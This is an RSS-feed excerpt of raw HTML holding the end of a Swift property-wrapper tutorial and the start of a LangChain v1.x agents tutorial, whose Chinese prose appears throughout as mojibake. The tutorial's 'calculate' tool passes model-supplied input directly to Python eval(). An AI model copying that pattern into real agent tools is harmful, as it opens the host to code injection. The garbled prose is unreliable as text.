<span class="hljs-keyword">struct</span> <span class="hljs-title class_">SmallNumber</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> number: <span class="hljs-type">Int</span>
    <span class="hljs-keyword">private(set)</span> <span class="hljs-keyword">var</span> projectedValue: <span class="hljs-type">Bool</span>
    
    <span class="hljs-keyword">var</span> wrappedValue: <span class="hljs-type">Int</span> {
        <span class="hljs-keyword">get</span> { <span class="hljs-keyword">return</span> number }
        <span class="hljs-keyword">set</span> {
            <span class="hljs-keyword">if</span> newValue <span class="hljs-operator">&gt;</span> <span class="hljs-number">12</span> {
                number <span class="hljs-operator">=</span> <span class="hljs-number">12</span>
                projectedValue <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>
            } <span class="hljs-keyword">else</span> {
                number <span class="hljs-operator">=</span> newValue
                projectedValue <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
            }
        }
    }
    
    <span class="hljs-keyword">init</span>() {
        <span class="hljs-keyword">self</span>.number <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
        <span class="hljs-keyword">self</span>.projectedValue <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    }
}
</code></pre>
<p>ä¸Šé¢ä»£ç ä¸­ï¼ŒSmallNumber ç»“æ„å¢åŠ äº†ä¸€ä¸ªå±æ€§ projectedValueï¼Œç”¨æ¥è®°å½•åŒ…è£…å™¨æ˜¯å¦è°ƒæ•´äº†è¢«åŒ…è£…çš„å€¼ã€‚</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">SomeStructure</span> {
    <span class="hljs-meta">@SmallNumber</span> <span class="hljs-keyword">var</span> someNumber: <span class="hljs-type">Int</span>
}

<span class="hljs-keyword">var</span> someStructure <span class="hljs-operator">=</span> <span class="hljs-type">SomeStructure</span>()
<span class="hljs-built_in">print</span>(someStructure.<span class="hljs-variable">$someNumber</span>)
<span class="hljs-comment">// æ‰“å° false</span>
someStructure.someNumber <span class="hljs-operator">=</span> <span class="hljs-number">55</span>
<span class="hljs-built_in">print</span>(someStructure.<span class="hljs-variable">$someNumber</span>)
<span class="hljs-comment">// æ‰“å° true</span>
</code></pre>
<p>é€šè¿‡åœ¨è¢«åŒ…è£…çš„å±æ€§åå‰å¢åŠ  $ æ¥è®¿é—®åŒ…è£…å™¨çš„ projectedValueã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åˆè¯† LangChain v1.x Agents]]></title>    <link>https://juejin.cn/post/7600326947506176052</link>    <guid>https://juejin.cn/post/7600326947506176052</guid>    <pubDate>2026-01-29T06:28:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600326947506176052" data-draft-id="7600341731047374883" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åˆè¯† LangChain v1.x Agents "/> <meta itemprop="keywords" content="LangChain,Agent"/> <meta itemprop="datePublished" content="2026-01-29T06:28:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é™ˆæš–ç§‹"/> <meta itemprop="url" content="https://juejin.cn/user/493019579297533"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åˆè¯† LangChain v1.x Agents 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/493019579297533/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é™ˆæš–ç§‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T06:28:18.000Z" title="Thu Jan 29 2026 06:28:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>404:Not Found</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0">ğŸ“– ç›®å½•</h2>
<ol>
<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF-agent" title="#%E4%BB%80%E4%B9%88%E6%98%AF-agent">ä»€ä¹ˆæ˜¯ Agentï¼Ÿ</a></li>
<li><a href="#agent-%E7%9A%84%E6%A0%B8%E5%BF%83%E7%BB%84%E4%BB%B6" title="#agent-%E7%9A%84%E6%A0%B8%E5%BF%83%E7%BB%84%E4%BB%B6">Agent çš„æ ¸å¿ƒç»„ä»¶</a></li>
<li><a href="#%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B%E5%88%9B%E5%BB%BA%E4%BD%A0%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA-agent" title="#%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B%E5%88%9B%E5%BB%BA%E4%BD%A0%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA-agent">å¿«é€Ÿä¸Šæ‰‹ï¼šåˆ›å»ºä½ çš„ç¬¬ä¸€ä¸ª Agent</a></li>
<li><a href="#%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3agent-%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86" title="#%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3agent-%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86">æ·±å…¥ç†è§£ï¼šAgent çš„å·¥ä½œåŸç†</a></li>
<li><a href="#%E9%AB%98%E7%BA%A7%E7%89%B9%E6%80%A7" title="#%E9%AB%98%E7%BA%A7%E7%89%B9%E6%80%A7">é«˜çº§ç‰¹æ€§</a></li>
<li><a href="#%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B" title="#%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B">å®æˆ˜æ¡ˆä¾‹</a></li>
</ol>
<hr/>
<h2 data-id="heading-1">ä»€ä¹ˆæ˜¯ Agentï¼Ÿ</h2>
<p>æƒ³è±¡ä¸€ä¸‹ï¼Œä½ æœ‰ä¸€ä¸ªèªæ˜çš„åŠ©æ‰‹ï¼Œå®ƒä¸ä»…èƒ½å›ç­”é—®é¢˜ï¼Œè¿˜èƒ½ä¸»åŠ¨ä½¿ç”¨å„ç§å·¥å…·æ¥å®Œæˆä»»åŠ¡ã€‚è¿™å°±æ˜¯ <strong>Agent</strong>ï¼ˆæ™ºèƒ½ä»£ç†ï¼‰ï¼</p>
<h3 data-id="heading-2">ğŸ¯ Agent vs æ™®é€š LLM</h3>






























<table><thead><tr><th>ç‰¹æ€§</th><th>æ™®é€š LLM</th><th>Agent</th></tr></thead><tbody><tr><td>å›ç­”é—®é¢˜</td><td>âœ…</td><td>âœ…</td></tr><tr><td>ä½¿ç”¨å·¥å…·</td><td>âŒ</td><td>âœ…</td></tr><tr><td>å¤šæ­¥æ¨ç†</td><td>æœ‰é™</td><td>âœ…</td></tr><tr><td>è‡ªä¸»å†³ç­–</td><td>âŒ</td><td>âœ…</td></tr></tbody></table>
<h3 data-id="heading-3">ğŸ“Š Agent çš„å·¥ä½œæµç¨‹</h3>
<pre><code class="hljs language-markdown" lang="markdown">ç”¨æˆ·è¾“å…¥ â†’ LLM æ¨ç† â†’ é€‰æ‹©å·¥å…· â†’ æ‰§è¡Œå·¥å…· â†’ è§‚å¯Ÿç»“æœ â†’ å†æ¬¡æ¨ç† â†’ æœ€ç»ˆç­”æ¡ˆ
<span class="hljs-code">         â†‘______________________________________________|
                    ï¼ˆå¾ªç¯ç›´åˆ°å¾—å‡ºç­”æ¡ˆï¼‰
</span></code></pre>
<hr/>
<h2 data-id="heading-4">Agent çš„æ ¸å¿ƒç»„ä»¶</h2>
<p>ä¸€ä¸ªå®Œæ•´çš„ Agent ç³»ç»Ÿç”±ä¸‰ä¸ªæ ¸å¿ƒéƒ¨åˆ†ç»„æˆï¼š</p>
<h3 data-id="heading-5">1. ğŸ§  æ¨¡å‹ï¼ˆModelï¼‰</h3>
<p>æ¨¡å‹æ˜¯ Agent çš„"å¤§è„‘"ï¼Œè´Ÿè´£æ¨ç†å’Œå†³ç­–ã€‚</p>
<p><strong>é™æ€æ¨¡å‹é…ç½®ï¼š</strong></p>
<p>åœ¨åˆ›å»ºagentçš„æ—¶å€™é…ç½®ä¸€æ¬¡ï¼Œåç»­åœ¨æ•´ä¸ªæ‰§è¡Œè¿‡ç¨‹ä¸­ä¿æŒä¸å˜ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain.agents <span class="hljs-keyword">import</span> create_agent
<span class="hljs-keyword">from</span> langchain_deepseek <span class="hljs-keyword">import</span> ChatDeepSeek

<span class="hljs-comment"># æ–¹å¼1ï¼šä½¿ç”¨æ¨¡å‹æ ‡è¯†ç¬¦å­—ç¬¦ä¸²ï¼ˆç®€å•å¿«æ·ï¼‰</span>
agent = create_agent(<span class="hljs-string">"deepseek:deepseek-chat"</span>, tools=tools)

<span class="hljs-comment"># æ–¹å¼2ï¼šä½¿ç”¨æ¨¡å‹å®ä¾‹ï¼ˆæ›´å¤šæ§åˆ¶ï¼‰</span>
model = ChatDeepSeek(
    model=<span class="hljs-string">"deepseek-chat"</span>,
    temperature=<span class="hljs-number">0.7</span>,  <span class="hljs-comment"># æ§åˆ¶åˆ›é€ æ€§</span>
    max_tokens=<span class="hljs-number">2000</span>,  <span class="hljs-comment"># é™åˆ¶è¾“å‡ºé•¿åº¦</span>
    timeout=<span class="hljs-number">60</span>        <span class="hljs-comment"># è¶…æ—¶è®¾ç½®</span>
)
agent = create_agent(model, tools=tools)
</code></pre>
<p><strong>åŠ¨æ€æ¨¡å‹é€‰æ‹©ï¼š</strong></p>
<p>æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦æ ¹æ®ä¸åŒåœºæ™¯é€‰æ‹©ä¸åŒçš„æ¨¡å‹ã€‚æ¯”å¦‚ç®€å•é—®é¢˜ç”¨ä¾¿å®œçš„æ¨¡å‹ï¼Œå¤æ‚é—®é¢˜ç”¨å¼ºå¤§çš„æ¨¡å‹ï¼š
æˆ‘ä»¬é€šè¿‡ <code>@wrap_model_call</code> è£…é¥°å™¨æ¥åˆ›å»ºä¸­é—´ä»¶çš„æ–¹å¼æ¥ä½¿ç”¨åŠ¨æ€æ¨¡å‹ï¼Œæ¦‚ä¸­é—´ä»¶ä¼šä¿®æ”¹è¯·æ±‚ä¸­çš„æ¨¡å‹ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain.agents.middleware <span class="hljs-keyword">import</span> wrap_model_call

basic_model = ChatDeepSeek(model=<span class="hljs-string">"deepseek-chat"</span>)
advanced_model = ChatDeepSeek(model=<span class="hljs-string">"deepseek-reasoner"</span>)

<span class="hljs-meta">@wrap_model_call</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">smart_model_selection</span>(<span class="hljs-params">request, handler</span>):
    <span class="hljs-string">"""æ ¹æ®å¯¹è¯å¤æ‚åº¦æ™ºèƒ½é€‰æ‹©æ¨¡å‹"""</span>
    message_count = <span class="hljs-built_in">len</span>(request.state[<span class="hljs-string">"messages"</span>])
    
    <span class="hljs-keyword">if</span> message_count &gt; <span class="hljs-number">10</span>:
        <span class="hljs-comment"># é•¿å¯¹è¯ä½¿ç”¨æ¨ç†æ¨¡å‹</span>
        model = advanced_model
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"ğŸ“ˆ ä½¿ç”¨æ¨ç†æ¨¡å‹å¤„ç†å¤æ‚å¯¹è¯"</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment"># çŸ­å¯¹è¯ä½¿ç”¨å¯¹è¯æ¨¡å‹èŠ‚çœæˆæœ¬</span>
        model = basic_model
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"ğŸ’¡ ä½¿ç”¨å¯¹è¯æ¨¡å‹å¤„ç†ç®€å•å¯¹è¯"</span>)
    
    <span class="hljs-keyword">return</span> handler(request.override(model=model))

agent = create_agent(
    model=basic_model,
    tools=tools,
    middleware=[smart_model_selection]
)
</code></pre>
<h3 data-id="heading-6">2. ğŸ”§ å·¥å…·ï¼ˆToolsï¼‰</h3>
<p>å·¥å…·èµ‹äºˆ Agent è¡ŒåŠ¨èƒ½åŠ›ï¼Œè®©å®ƒèƒ½å¤Ÿä¸å¤–éƒ¨ä¸–ç•Œäº¤äº’ã€‚</p>
<p><strong>å®šä¹‰å·¥å…·ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain.tools <span class="hljs-keyword">import</span> tool

<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">search_web</span>(<span class="hljs-params">query: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""åœ¨äº’è”ç½‘ä¸Šæœç´¢ä¿¡æ¯"""</span>
    <span class="hljs-comment"># å®é™…é¡¹ç›®ä¸­è¿™é‡Œä¼šè°ƒç”¨çœŸå®çš„æœç´¢ API</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"æœç´¢ç»“æœï¼š<span class="hljs-subst">{query}</span> çš„ç›¸å…³ä¿¡æ¯..."</span>

<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_weather</span>(<span class="hljs-params">city: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""è·å–æŒ‡å®šåŸå¸‚çš„å¤©æ°”ä¿¡æ¯"""</span>
    <span class="hljs-comment"># å®é™…é¡¹ç›®ä¸­è¿™é‡Œä¼šè°ƒç”¨å¤©æ°” API</span>
    weather_data = {
        <span class="hljs-string">"åŒ—äº¬"</span>: <span class="hljs-string">"æ™´å¤©ï¼Œ15Â°C"</span>,
        <span class="hljs-string">"ä¸Šæµ·"</span>: <span class="hljs-string">"å¤šäº‘ï¼Œ18Â°C"</span>,
        <span class="hljs-string">"æ·±åœ³"</span>: <span class="hljs-string">"é˜´å¤©ï¼Œ22Â°C"</span>
    }
    <span class="hljs-keyword">return</span> weather_data.get(city, <span class="hljs-string">"æœªçŸ¥åŸå¸‚"</span>)

<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate</span>(<span class="hljs-params">expression: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""è®¡ç®—æ•°å­¦è¡¨è¾¾å¼"""</span>
    <span class="hljs-keyword">try</span>:
        result = <span class="hljs-built_in">eval</span>(expression)
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"è®¡ç®—ç»“æœï¼š<span class="hljs-subst">{result}</span>"</span>
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"è®¡ç®—é”™è¯¯ï¼š<span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>

<span class="hljs-comment"># åˆ›å»º Agent æ—¶ä¼ å…¥å·¥å…·åˆ—è¡¨</span>
tools = [search_web, get_weather, calculate]
</code></pre>
<blockquote>
<p>å¦‚æœæä¾›äº†ä¸€ä¸ªç©ºçš„å·¥å…·åˆ—è¡¨ï¼Œæ™ºèƒ½ä½“å°†ç”±ä¸€ä¸ªä¸å…·å¤‡å·¥å…·è°ƒç”¨åŠŸèƒ½çš„å•ä¸ª LLM èŠ‚ç‚¹ç»„æˆã€‚</p>
</blockquote>
<p><strong>å·¥å…·é”™è¯¯å¤„ç†ï¼š</strong></p>
<p>é€šè¿‡ <code>@wrap_tool_call</code> ä¸­é—´ä»¶è‡ªå®šä¹‰å·¥å…·é”™è¯¯çš„å¤„ç†æ–¹å¼ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain.agents.middleware <span class="hljs-keyword">import</span> wrap_tool_call
<span class="hljs-keyword">from</span> langchain.messages <span class="hljs-keyword">import</span> ToolMessage

<span class="hljs-meta">@wrap_tool_call</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_tool_errors</span>(<span class="hljs-params">request, handler</span>):
    <span class="hljs-string">"""ä¼˜é›…åœ°å¤„ç†å·¥å…·æ‰§è¡Œé”™è¯¯"""</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">return</span> handler(request)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"âŒ å·¥å…·æ‰§è¡Œå¤±è´¥ï¼š<span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)
        <span class="hljs-keyword">return</span> ToolMessage(
            content=<span class="hljs-string">f"å·¥å…·æ‰§è¡Œå‡ºé”™ï¼Œè¯·æ£€æŸ¥è¾“å…¥åé‡è¯•ã€‚é”™è¯¯ä¿¡æ¯ï¼š<span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>,
            tool_call_id=request.tool_call[<span class="hljs-string">"id"</span>]
        )

agent = create_agent(
    model=<span class="hljs-string">"deepseek-chat"</span>,
    tools=[search_web, get_weather, calculate],
    middleware=[handle_tool_errors]
)
</code></pre>
<p>ä¸Šè¿°ç¤ºä¾‹ï¼Œä¼šåœ¨å·¥å…·å¤±è´¥æ—¶ï¼Œè¿”å›ä¸€ä¸ªè‡ªå®šä¹‰çš„é”™è¯¯æ¶ˆæ¯ <code>ToolMessage</code> ã€‚</p>
<h3 data-id="heading-7">3. ğŸ’¬ ç³»ç»Ÿæç¤ºè¯ï¼ˆSystem Promptï¼‰</h3>
<p>ç³»ç»Ÿæç¤ºè¯å®šä¹‰äº† Agent çš„"æ€§æ ¼"å’Œè¡Œä¸ºå‡†åˆ™ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åŸºç¡€ç³»ç»Ÿæç¤ºè¯</span>
agent = create_agent(
    model=<span class="hljs-string">"deepseek-chat"</span>,
    tools=tools,
    system_prompt=<span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„æ•°æ®åˆ†æåŠ©æ‰‹ï¼Œæ“…é•¿ç”¨å›¾è¡¨å’Œæ•°æ®è¯´è¯ã€‚"</span>
)

<span class="hljs-comment"># åŠ¨æ€ç³»ç»Ÿæç¤ºè¯ï¼ˆæ ¹æ®ç”¨æˆ·è§’è‰²è°ƒæ•´ï¼‰</span>
<span class="hljs-keyword">from</span> langchain.agents.middleware <span class="hljs-keyword">import</span> dynamic_prompt

<span class="hljs-meta">@dynamic_prompt</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">role_based_prompt</span>(<span class="hljs-params">request</span>):
    <span class="hljs-string">"""æ ¹æ®ç”¨æˆ·è§’è‰²ç”Ÿæˆä¸ªæ€§åŒ–æç¤ºè¯"""</span>
    user_role = request.runtime.context.get(<span class="hljs-string">"user_role"</span>, <span class="hljs-string">"æ™®é€šç”¨æˆ·"</span>)
    
    prompts = {
        <span class="hljs-string">"ä¸“å®¶"</span>: <span class="hljs-string">"ä½ æ˜¯æŠ€æœ¯ä¸“å®¶åŠ©æ‰‹ï¼Œæä¾›æ·±å…¥çš„æŠ€æœ¯åˆ†æå’Œè¯¦ç»†è§£é‡Šã€‚"</span>,
        <span class="hljs-string">"åˆå­¦è€…"</span>: <span class="hljs-string">"ä½ æ˜¯æ–°æ‰‹å‹å¥½çš„åŠ©æ‰‹ï¼Œç”¨ç®€å•æ˜“æ‡‚çš„è¯­è¨€è§£é‡Šæ¦‚å¿µï¼Œé¿å…æœ¯è¯­ã€‚"</span>,
        <span class="hljs-string">"å­¦ç”Ÿ"</span>: <span class="hljs-string">"ä½ æ˜¯æ•™å­¦åŠ©æ‰‹ï¼Œé€šè¿‡ä¾‹å­å’Œç±»æ¯”å¸®åŠ©å­¦ç”Ÿç†è§£çŸ¥è¯†ã€‚"</span>
    }
    
    <span class="hljs-keyword">return</span> prompts.get(user_role, <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªå‹å¥½çš„é€šç”¨åŠ©æ‰‹ã€‚"</span>)

agent = create_agent(
    model=<span class="hljs-string">"deepseek-chat"</span>,
    tools=tools,
    middleware=[role_based_prompt]
)
</code></pre>
<blockquote>
<p>å½“æœªæä¾› system_prompt æ—¶ï¼Œagentä¼šç›´æ¥ä»æ¶ˆæ¯ä¸­æ¨æ–­å…¶ä»»åŠ¡ã€‚
@dynamic_prompt è£…é¥°å™¨åˆ›å»ºäº†ä¸€ä¸ªä¸­é—´ä»¶ï¼Œå¯ä»¥æ ¹æ®æ¨¡å‹è¯·æ±‚åŠ¨æ€ç”Ÿæˆç³»ç»Ÿæç¤º</p>
</blockquote>
<hr/>
<h2 data-id="heading-8">å¿«é€Ÿä¸Šæ‰‹ï¼šåˆ›å»ºä½ çš„ç¬¬ä¸€ä¸ª Agent</h2>
<h3 data-id="heading-9">ğŸ¬ å®Œæ•´ç¤ºä¾‹ï¼šå¤©æ°”æŸ¥è¯¢åŠ©æ‰‹</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain.agents <span class="hljs-keyword">import</span> create_agent
<span class="hljs-keyword">from</span> langchain_deepseek <span class="hljs-keyword">import</span> ChatDeepSeek
<span class="hljs-keyword">from</span> langchain.tools <span class="hljs-keyword">import</span> tool

<span class="hljs-comment"># æ­¥éª¤1ï¼šå®šä¹‰å·¥å…·</span>
<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_weather</span>(<span class="hljs-params">city: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""è·å–åŸå¸‚å¤©æ°”ä¿¡æ¯
    
    Args:
        city: åŸå¸‚åç§°ï¼Œå¦‚"åŒ—äº¬"ã€"ä¸Šæµ·"
    
    Returns:
        è¯¥åŸå¸‚çš„å¤©æ°”ä¿¡æ¯
    """</span>
    weather_db = {
        <span class="hljs-string">"åŒ—äº¬"</span>: <span class="hljs-string">"â˜€ï¸ æ™´å¤©ï¼Œæ¸©åº¦ 15Â°Cï¼Œç©ºæ°”è´¨é‡è‰¯å¥½"</span>,
        <span class="hljs-string">"ä¸Šæµ·"</span>: <span class="hljs-string">"â›… å¤šäº‘ï¼Œæ¸©åº¦ 18Â°Cï¼Œæœ‰è½»å¾®é›¾éœ¾"</span>,
        <span class="hljs-string">"æ·±åœ³"</span>: <span class="hljs-string">"ğŸŒ§ï¸ å°é›¨ï¼Œæ¸©åº¦ 22Â°Cï¼Œæ¹¿åº¦è¾ƒå¤§"</span>,
        <span class="hljs-string">"å¹¿å·"</span>: <span class="hljs-string">"â˜€ï¸ æ™´å¤©ï¼Œæ¸©åº¦ 25Â°Cï¼Œé€‚åˆå¤–å‡º"</span>
    }
    <span class="hljs-keyword">return</span> weather_db.get(city, <span class="hljs-string">f"æŠ±æ­‰ï¼Œæš‚æ—  <span class="hljs-subst">{city}</span> çš„å¤©æ°”ä¿¡æ¯"</span>)

<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_weather_forecast</span>(<span class="hljs-params">city: <span class="hljs-built_in">str</span>, days: <span class="hljs-built_in">int</span> = <span class="hljs-number">3</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""è·å–åŸå¸‚æœªæ¥å‡ å¤©çš„å¤©æ°”é¢„æŠ¥
    
    Args:
        city: åŸå¸‚åç§°
        days: é¢„æŠ¥å¤©æ•°ï¼ˆé»˜è®¤3å¤©ï¼‰
    
    Returns:
        æœªæ¥å‡ å¤©çš„å¤©æ°”é¢„æŠ¥
    """</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"<span class="hljs-subst">{city}</span> æœªæ¥ <span class="hljs-subst">{days}</span> å¤©å¤©æ°”ï¼š\nç¬¬1å¤©ï¼šæ™´ 20Â°C\nç¬¬2å¤©ï¼šå¤šäº‘ 18Â°C\nç¬¬3å¤©ï¼šå°é›¨ 16Â°C"</span>

<span class="hljs-comment"># æ­¥éª¤2ï¼šåˆ›å»º Agent</span>
weather_agent = create_agent(
    model=ChatDeepSeek(model=<span class="hljs-string">"deepseek-chat"</span>, temperature=<span class="hljs-number">0</span>),
    tools=[get_weather, get_weather_forecast],
    system_prompt=<span class="hljs-string">"""ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„å¤©æ°”åŠ©æ‰‹ã€‚
    
    ä½ çš„èŒè´£ï¼š
    1. å‡†ç¡®æä¾›ç”¨æˆ·æŸ¥è¯¢çš„åŸå¸‚å¤©æ°”ä¿¡æ¯
    2. å¦‚æœç”¨æˆ·è¯¢é—®æœªæ¥å¤©æ°”ï¼Œä¸»åŠ¨ä½¿ç”¨å¤©æ°”é¢„æŠ¥å·¥å…·
    3. ç»™å‡ºè´´å¿ƒçš„å‡ºè¡Œå»ºè®®
    
    å›ç­”é£æ ¼ï¼šå‹å¥½ã€ç®€æ´ã€å®ç”¨
    """</span>
)

<span class="hljs-comment"># æ­¥éª¤3ï¼šä½¿ç”¨ Agent</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"ğŸ¤– å¤©æ°”åŠ©æ‰‹å·²å¯åŠ¨ï¼\n"</span>)

<span class="hljs-comment"># ç¤ºä¾‹å¯¹è¯1ï¼šæŸ¥è¯¢å½“å‰å¤©æ°”</span>
result1 = weather_agent.invoke({
    <span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"åŒ—äº¬ç°åœ¨å¤©æ°”æ€ä¹ˆæ ·ï¼Ÿ"</span>}]
})
<span class="hljs-built_in">print</span>(<span class="hljs-string">"ç”¨æˆ·ï¼šåŒ—äº¬ç°åœ¨å¤©æ°”æ€ä¹ˆæ ·ï¼Ÿ"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"åŠ©æ‰‹ï¼š<span class="hljs-subst">{result1[<span class="hljs-string">'messages'</span>][-<span class="hljs-number">1</span>].content}</span>\n"</span>)

<span class="hljs-comment"># ç¤ºä¾‹å¯¹è¯2ï¼šæŸ¥è¯¢æœªæ¥å¤©æ°”</span>
result2 = weather_agent.invoke({
